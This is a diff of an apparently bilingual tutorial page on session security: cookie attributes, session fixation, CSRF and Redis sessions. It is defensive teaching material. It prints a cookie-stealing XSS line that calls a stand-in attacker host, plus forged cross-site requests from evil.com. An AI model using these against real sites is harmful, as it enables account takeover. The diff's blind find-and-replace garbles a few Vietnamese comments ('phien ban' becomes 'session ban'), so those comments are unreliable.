@@ -69,9 +69,9 @@ export async function createSession(userId: string, req: Request) {
   });
   return token;                                   <span class="tok-comment">// chỉ trả về ĐÚNG MỘT LẦN</span>
 }</code></pre>
-<div class="out">prisma:query INSERT INTO "Phien" ("tokenBam","nguoiDungId","hetHanTuyetDoi",…)
+<div class="out">prisma:query INSERT INTO "Session" ("tokenHash","userId","absoluteExpiresAt",…)
 
-Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
+Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
 
 # Token that chi ton tai o hai noi: cookie cua trinh duyet,
 # va bo nho cua tien trinh nay trong vai mili giay. Khong o dau khac.</div>
@@ -141,7 +141,7 @@ WHERE "absoluteExpiresAt" &lt; now() - interval '7 days'
 <div class="out">DELETE 184203
 Time: 892.104 ms
 
-# Giu lai 7 ngay sau khi het han: du de tra loi "phien do co bi dung
+# Giu lai 7 ngay sau khi het han: du de tra loi "session do co bi dung
 # sau khi nguoi ta bao da dang xuat khong", va du ngan de bang khong phinh.</div>
 <div class="note-ct">
 <p><strong>Why the boring option is usually the right one.</strong> Everything in this lesson is a table and an index. There is no cryptography to get wrong, revocation is a single <code>UPDATE</code>, the device list falls out of the schema for free, and you can answer any question about who was logged in when. The cost is one indexed lookup per request. Chapter 4 covers the alternative honestly, including the cases where it genuinely wins — but if you are building one application with one database, start here and only move when you have a measured reason.</p>
@@ -204,9 +204,9 @@ export async function createSession(userId: string, req: Request) {
   });
   return token;                                   <span class="tok-comment">// chỉ trả về ĐÚNG MỘT LẦN</span>
 }</code></pre>
-<div class="out">prisma:query INSERT INTO "Phien" ("tokenBam","nguoiDungId","hetHanTuyetDoi",…)
+<div class="out">prisma:query INSERT INTO "Session" ("tokenHash","userId","absoluteExpiresAt",…)
 
-Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
+Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
 
 # Token that chi ton tai o hai noi: cookie cua trinh duyet,
 # va bo nho cua tien trinh nay trong vai mili giay. Khong o dau khac.</div>
@@ -276,7 +276,7 @@ WHERE "absoluteExpiresAt" &lt; now() - interval '7 days'
 <div class="out">DELETE 184203
 Time: 892.104 ms
 
-# Giu lai 7 ngay sau khi het han: du de tra loi "phien do co bi dung
+# Giu lai 7 ngay sau khi het han: du de tra loi "session do co bi dung
 # sau khi nguoi ta bao da dang xuat khong", va du ngan de bang khong phinh.</div>
 <div class="note-ct">
 <p><strong>Vì sao lựa chọn NHÀM CHÁN thường là lựa chọn đúng.</strong> Mọi thứ trong bài này là MỘT cái bảng và vài cái chỉ mục. Không có mật mã nào để làm sai, thu hồi là một câu <code>UPDATE</code> duy nhất, danh sách thiết bị tự rơi ra từ lược đồ mà không tốn gì, và bạn trả lời được mọi câu hỏi về ai đã đăng nhập lúc nào. Cái giá là MỘT lần tra chỉ mục cho mỗi request. Chương 4 nói về lựa chọn kia một cách trung thực, kể cả những trường hợp nó thắng thật — nhưng nếu bạn đang dựng MỘT ứng dụng với MỘT cơ sở dữ liệu thì hãy bắt đầu từ đây, và chỉ chuyển khi có một lý do ĐO ĐƯỢC.</p>
@@ -323,7 +323,7 @@ res.cookie('__Host-session', token, {
 <pre><code><span class="tok-comment">// Với HttpOnly, đoạn XSS này không lấy được gì</span>
 fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 <div class="out">// Khong co HttpOnly:
-"__Host-phien=Kc9x2Lm…; theme=dark"     ← ca phien di ra ngoai
+"__Host-session=Kc9x2Lm…; theme=dark"     ← ca session di ra ngoai
 
 // Co HttpOnly:
 "theme=dark"                              ← chi con cookie khong nhay cam</div>
@@ -362,7 +362,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 <div class="out">SameSite=Lax  → cookie KHONG duoc gui (POST xuyen trang) → 401 ✅
 SameSite=None → cookie DUOC gui → chuyen tien thanh cong ❌
 Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
-                khac nhau tuy phien ban → DUNG dua vao mac dinh</div>
+                khac nhau tuy session ban → DUNG dua vao mac dinh</div>
 <div class="kv-grid">
   <div class="kv"><span class="k">Choose <code>Lax</code> for a session cookie</span><span class="v">It blocks the cross-site POST above while letting a user who clicks a link to your site arrive logged in. That combination is what makes it the right default for almost every application.</span></div>
   <div class="kv"><span class="k"><code>Strict</code> has a real usability cost</span><span class="v">A user following a link from an email or a search result arrives logged out, which reads as a bug. The common pattern is a <code>Strict</code> cookie for high-value actions alongside a <code>Lax</code> one for identity — worth it for banking, overkill for most things.</span></div>
@@ -373,7 +373,7 @@ Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
 <h3><code>Domain</code> — the attribute to leave out</h3>
 <pre><code>Set-Cookie: session=…;                      <span class="tok-comment">// host-only: CHỈ vidu.com</span>
 Set-Cookie: session=…; Domain=vidu.com      <span class="tok-comment">// vidu.com VÀ mọi tên miền con</span></code></pre>
-<div class="out">Voi Domain=vidu.com, cookie phien duoc gui toi:
+<div class="out">Voi Domain=vidu.com, cookie session duoc gui toi:
   vidu.com            ✅ y dinh
   app.vidu.com        ✅ y dinh
   blog.vidu.com       ← WordPress cu, plugin loi thoi
@@ -381,7 +381,7 @@ Set-Cookie: session=…; Domain=vidu.com      <span class="tok-comment">// vidu.
   cu.vidu.com         ← tro toi mot IP khong con ai so huu
 
 # Mot lo XSS o blog, hoac mot cu chiem ten mien con o "cu",
-# la doc duoc cookie phien cua toan bo san pham chinh.</div>
+# la doc duoc cookie session cua toan bo san pham chinh.</div>
 <div class="lz-stack">
   <div class="lz-layer"><span class="lz-lname">Omit <code>Domain</code> by default</span><span class="lz-lnote">Leaving it out makes the cookie host-only: it goes to exactly the host that set it and nowhere else. This is both the safest option and the one you get for free by not typing anything.</span></div>
   <div class="lz-layer"><span class="lz-lname">Subdomain takeover is a real class of bug</span><span class="lz-lnote">A <code>CNAME</code> pointing at a deleted Heroku app or an unclaimed S3 bucket lets anyone register that name and serve content from <code>cu.vidu.com</code>. With a domain-wide cookie, that is instant session theft across your whole product.</span></div>
@@ -410,7 +410,7 @@ res.clearCookie('__Host-session', {
 # Sai bat ky phan nao la ban dat mot cookie MOI da het han
 # ben canh cai cu — con cai cu thi van nam do va van duoc gui di.
 
-# Va du sao: xoa cookie KHONG phai dang xuat. Phai THU HOI hang phien
+# Va du sao: xoa cookie KHONG phai dang xuat. Phai THU HOI hang session
 # trong co so du lieu, neu khong thi ke cap van dung tiep binh thuong.</div>
 <div class="note-ct">
 <p><strong>The complete set, for a normal application.</strong> Name it <code>__Host-session</code> · <code>HttpOnly</code> · <code>Secure</code> · <code>SameSite=Lax</code> · <code>Path=/</code> · no <code>Domain</code> · <code>Max-Age</code> matching the session's absolute expiry · and <code>app.set('trust proxy', 1)</code> so <code>Secure</code> works behind Nginx. Six attributes, one line of Express configuration, and every one of them has a specific attack behind it. Write it once in a helper and never set a session cookie by hand again.</p>
@@ -450,7 +450,7 @@ res.cookie('__Host-session', token, {
 <pre><code><span class="tok-comment">// Với HttpOnly, đoạn XSS này không lấy được gì</span>
 fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 <div class="out">// Khong co HttpOnly:
-"__Host-phien=Kc9x2Lm…; theme=dark"     ← ca phien di ra ngoai
+"__Host-session=Kc9x2Lm…; theme=dark"     ← ca session di ra ngoai
 
 // Co HttpOnly:
 "theme=dark"                              ← chi con cookie khong nhay cam</div>
@@ -489,7 +489,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 <div class="out">SameSite=Lax  → cookie KHONG duoc gui (POST xuyen trang) → 401 ✅
 SameSite=None → cookie DUOC gui → chuyen tien thanh cong ❌
 Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
-                khac nhau tuy phien ban → DUNG dua vao mac dinh</div>
+                khac nhau tuy session ban → DUNG dua vao mac dinh</div>
 <div class="kv-grid">
   <div class="kv"><span class="k">Chọn <code>Lax</code> cho cookie phiên</span><span class="v">Nó chặn cú POST xuyên trang ở trên trong khi vẫn để một người bấm liên kết tới trang bạn đến nơi ở trạng thái ĐÃ đăng nhập. Chính tổ hợp đó làm nó thành mặc định đúng cho gần như mọi ứng dụng.</span></div>
   <div class="kv"><span class="k"><code>Strict</code> có một cái giá trải nghiệm THẬT</span><span class="v">Một người bấm liên kết từ email hay từ kết quả tìm kiếm sẽ tới nơi ở trạng thái ĐĂNG XUẤT, và điều đó bị đọc như một con bug. Mẫu phổ biến là một cookie <code>Strict</code> cho các hành động giá trị cao đặt cạnh một cookie <code>Lax</code> cho danh tính — đáng với ngân hàng, thừa thãi với phần lớn thứ khác.</span></div>
@@ -500,7 +500,7 @@ Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
 <h3><code>Domain</code> — cái thuộc tính nên BỎ TRỐNG</h3>
 <pre><code>Set-Cookie: session=…;                      <span class="tok-comment">// chỉ-host: CHỈ vidu.com</span>
 Set-Cookie: session=…; Domain=vidu.com      <span class="tok-comment">// vidu.com VÀ mọi tên miền con</span></code></pre>
-<div class="out">Voi Domain=vidu.com, cookie phien duoc gui toi:
+<div class="out">Voi Domain=vidu.com, cookie session duoc gui toi:
   vidu.com            ✅ y dinh
   app.vidu.com        ✅ y dinh
   blog.vidu.com       ← WordPress cu, plugin loi thoi
@@ -508,7 +508,7 @@ Set-Cookie: session=…; Domain=vidu.com      <span class="tok-comment">// vidu.
   cu.vidu.com         ← tro toi mot IP khong con ai so huu
 
 # Mot lo XSS o blog, hoac mot cu chiem ten mien con o "cu",
-# la doc duoc cookie phien cua toan bo san pham chinh.</div>
+# la doc duoc cookie session cua toan bo san pham chinh.</div>
 <div class="lz-stack">
   <div class="lz-layer"><span class="lz-lname">Mặc định là BỎ <code>Domain</code></span><span class="lz-lnote">Không ghi nó thì cookie thành CHỈ-HOST: nó chỉ đi tới đúng cái host đã đặt nó và không đi đâu khác. Đây vừa là lựa chọn an toàn nhất vừa là lựa chọn bạn có MIỄN PHÍ bằng cách không gõ gì cả.</span></div>
   <div class="lz-layer"><span class="lz-lname">Chiếm tên miền con là một LỚP bug có thật</span><span class="lz-lnote">Một bản ghi <code>CNAME</code> trỏ tới một app Heroku đã xoá hoặc một bucket S3 chưa ai nhận cho phép bất kỳ ai đăng ký cái tên đó và phục vụ nội dung từ <code>cu.vidu.com</code>. Với một cookie phủ cả tên miền, đó là cú cắp phiên TỨC THÌ trên toàn bộ sản phẩm của bạn.</span></div>
@@ -537,7 +537,7 @@ res.clearCookie('__Host-session', {
 # Sai bat ky phan nao la ban dat mot cookie MOI da het han
 # ben canh cai cu — con cai cu thi van nam do va van duoc gui di.
 
-# Va du sao: xoa cookie KHONG phai dang xuat. Phai THU HOI hang phien
+# Va du sao: xoa cookie KHONG phai dang xuat. Phai THU HOI hang session
 # trong co so du lieu, neu khong thi ke cap van dung tiep binh thuong.</div>
 <div class="note-ct">
 <p><strong>Bộ đầy đủ, cho một ứng dụng bình thường.</strong> Đặt tên là <code>__Host-session</code> · <code>HttpOnly</code> · <code>Secure</code> · <code>SameSite=Lax</code> · <code>Path=/</code> · KHÔNG có <code>Domain</code> · <code>Max-Age</code> khớp với hết-hạn-tuyệt-đối của phiên · và <code>app.set('trust proxy', 1)</code> để <code>Secure</code> chạy đúng sau Nginx. Sáu thuộc tính, một dòng cấu hình Express, và MỖI cái đều có một cú tấn công cụ thể đứng sau. Hãy viết nó MỘT lần trong một hàm phụ rồi đừng bao giờ đặt cookie phiên bằng tay nữa.</p>
@@ -589,8 +589,8 @@ app.post('/sign-in', async (req, res) =&gt; {
   });
   res.json({ ok: true });
 });</code></pre>
-<div class="out"># Ke tan cong da cam ma phien do TU TRUOC khi nan nhan dang nhap.
-# Bay gio no tro thanh mot phien DA XAC THUC, va ho van dang cam.
+<div class="out"># Ke tan cong da cam ma session do TU TRUOC khi nan nhan dang nhap.
+# Bay gio no tro thanh mot session DA XAC THUC, va ho van dang cam.
 # Mat khau dung, MFA dung, va tai khoan van bi chiem.</div>
 
 <h3>How the id gets planted</h3>
@@ -616,7 +616,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 
   res.json({ ok: true });
 });</code></pre>
-<div class="out">Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
+<div class="out">Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
 
 # Ma ke tan cong dang cam gio da bi thu hoi va tro nen vo dung.
 # Nan nhan cam mot ma moi ma ke tan cong chua bao gio thay.</div>
@@ -720,8 +720,8 @@ app.post('/sign-in', async (req, res) =&gt; {
   });
   res.json({ ok: true });
 });</code></pre>
-<div class="out"># Ke tan cong da cam ma phien do TU TRUOC khi nan nhan dang nhap.
-# Bay gio no tro thanh mot phien DA XAC THUC, va ho van dang cam.
+<div class="out"># Ke tan cong da cam ma session do TU TRUOC khi nan nhan dang nhap.
+# Bay gio no tro thanh mot session DA XAC THUC, va ho van dang cam.
 # Mat khau dung, MFA dung, va tai khoan van bi chiem.</div>
 
 <h3>Cái mã đó được CẮM vào bằng cách nào</h3>
@@ -747,7 +747,7 @@ app.post('/sign-in', async (req, res) =&gt; {
 
   res.json({ ok: true });
 });</code></pre>
-<div class="out">Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
+<div class="out">Set-Cookie: __Host-session=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
 
 # Ma ke tan cong dang cam gio da bi thu hoi va tro nen vo dung.
 # Nan nhan cam mot ma moi ma ke tan cong chua bao gio thay.</div>
@@ -851,12 +851,12 @@ app.post('/thanh-toan/rut-tien',  requireAuth, needsReauth(2), rutTien);</code><
 POST /api/doi-email HTTP/1.1
 Host: vidu.com
 Origin: https://evil.com                 ← trang GAY RA no
-Cookie: __Host-phien=Kc9x2Lm…            ← trinh duyet TU DINH VAO
+Cookie: __Host-session=Kc9x2Lm…            ← trinh duyet TU DINH VAO
 Content-Type: application/x-www-form-urlencoded
 
 email=ke-tan-cong%40evil.com
 
-# May chu nhin thay mot phien hop le. Vi no LA mot phien hop le.</div>
+# May chu nhin thay mot session hop le. Vi no LA mot session hop le.</div>
 <div class="lz-flow">
   <div class="lz-step"><span class="lz-k">The attacker cannot read</span><span class="lz-t">And does not need to</span><span class="lz-d">The same-origin policy stops <code>evil.com</code> reading the response. It does not stop the request being sent, and for "change my email", "delete this", "transfer money", sending is the whole attack.</span></div>
   <div class="lz-step"><span class="lz-k">A GET that changes state is the worst case</span><span class="lz-t">One <code>&lt;img&gt;</code> tag</span><span class="lz-d">No script needed, works in an email client, works in a comment on someone else's site. Make every state-changing endpoint a POST, PUT, PATCH or DELETE — that alone removes the easiest version.</span></div>
@@ -873,7 +873,7 @@ text/plain
 <span class="tok-comment">// Những cái đó là "request đơn giản": KHÔNG có preflight.</span>
 <span class="tok-comment">// CORS chặn kẻ tấn công ĐỌC phản hồi. Request thì vẫn ĐI TỚI.</span></code></pre>
 <div class="out">$ curl -i https://vidu.com/api/doi-email -H 'Origin: https://evil.com' \\
-    -d 'email=x@evil.com' --cookie 'phien=…'
+    -d 'email=x@evil.com' --cookie 'session=…'
 
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://vidu.com     ← trinh duyet SE chan viec doc
@@ -995,12 +995,12 @@ export function checkCsrfToken(req, res, next) {
 POST /api/doi-email HTTP/1.1
 Host: vidu.com
 Origin: https://evil.com                 ← trang GAY RA no
-Cookie: __Host-phien=Kc9x2Lm…            ← trinh duyet TU DINH VAO
+Cookie: __Host-session=Kc9x2Lm…            ← trinh duyet TU DINH VAO
 Content-Type: application/x-www-form-urlencoded
 
 email=ke-tan-cong%40evil.com
 
-# May chu nhin thay mot phien hop le. Vi no LA mot phien hop le.</div>
+# May chu nhin thay mot session hop le. Vi no LA mot session hop le.</div>
 <div class="lz-flow">
   <div class="lz-step"><span class="lz-k">Kẻ tấn công KHÔNG đọc được</span><span class="lz-t">Và họ không cần đọc</span><span class="lz-d">Chính sách cùng-origin chặn <code>evil.com</code> ĐỌC phản hồi. Nó KHÔNG chặn việc request được GỬI ĐI, và với "đổi email của tôi", "xoá cái này", "chuyển tiền", thì GỬI ĐI chính là toàn bộ cú tấn công.</span></div>
   <div class="lz-step"><span class="lz-k">Một GET làm thay đổi trạng thái là ca TỆ NHẤT</span><span class="lz-t">Chỉ một thẻ <code>&lt;img&gt;</code></span><span class="lz-d">Không cần script, chạy được trong ứng dụng email, chạy được trong một bình luận trên trang của người khác. Hãy làm cho MỌI endpoint đổi trạng thái thành POST, PUT, PATCH hay DELETE — riêng điều đó đã xoá đi phiên bản dễ nhất.</span></div>
@@ -1017,7 +1017,7 @@ text/plain
 <span class="tok-comment">// Những cái đó là "request đơn giản": KHÔNG có preflight.</span>
 <span class="tok-comment">// CORS chặn kẻ tấn công ĐỌC phản hồi. Request thì vẫn ĐI TỚI.</span></code></pre>
 <div class="out">$ curl -i https://vidu.com/api/doi-email -H 'Origin: https://evil.com' \\
-    -d 'email=x@evil.com' --cookie 'phien=…'
+    -d 'email=x@evil.com' --cookie 'session=…'
 
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://vidu.com     ← trinh duyet SE chan viec doc
@@ -1189,13 +1189,13 @@ export async function getSession(token: string) {
   await redis.expire(key, IDLE_S);            <span class="tok-comment">// trượt cửa sổ nhàn rỗi</span>
   return session;
 }</code></pre>
-<div class="out">$ redis-cli TTL phien:8f2a91c4…
+<div class="out">$ redis-cli TTL session:8f2a91c4…
 (integer) 7194
 
-$ redis-cli SMEMBERS nguoi:clx7…:phien
-1) "phien:8f2a91c4…"          ← Chrome tren laptop
-2) "phien:d47b0e29…"          ← Safari tren dien thoai
-3) "phien:1c9fa38b…"          ← mot phien khong nhan ra
+$ redis-cli SMEMBERS nguoi:clx7…:session
+1) "session:8f2a91c4…"          ← Chrome tren laptop
+2) "session:d47b0e29…"          ← Safari tren dien thoai
+3) "session:1c9fa38b…"          ← mot session khong nhan ra
 
 # "Thoat khoi moi thiet bi" = DEL tat ca thanh vien cua set do.</div>
 <div class="lz-flow">
@@ -1304,13 +1304,13 @@ export async function getSession(token: string) {
   await redis.expire(key, IDLE_S);            <span class="tok-comment">// trượt cửa sổ nhàn rỗi</span>
   return session;
 }</code></pre>
-<div class="out">$ redis-cli TTL phien:8f2a91c4…
+<div class="out">$ redis-cli TTL session:8f2a91c4…
 (integer) 7194
 
-$ redis-cli SMEMBERS nguoi:clx7…:phien
-1) "phien:8f2a91c4…"          ← Chrome tren laptop
-2) "phien:d47b0e29…"          ← Safari tren dien thoai
-3) "phien:1c9fa38b…"          ← mot phien khong nhan ra
+$ redis-cli SMEMBERS nguoi:clx7…:session
+1) "session:8f2a91c4…"          ← Chrome tren laptop
+2) "session:d47b0e29…"          ← Safari tren dien thoai
+3) "session:1c9fa38b…"          ← mot session khong nhan ra
 
 # "Thoat khoi moi thiet bi" = DEL tat ca thanh vien cua set do.</div>
 <div class="lz-flow">
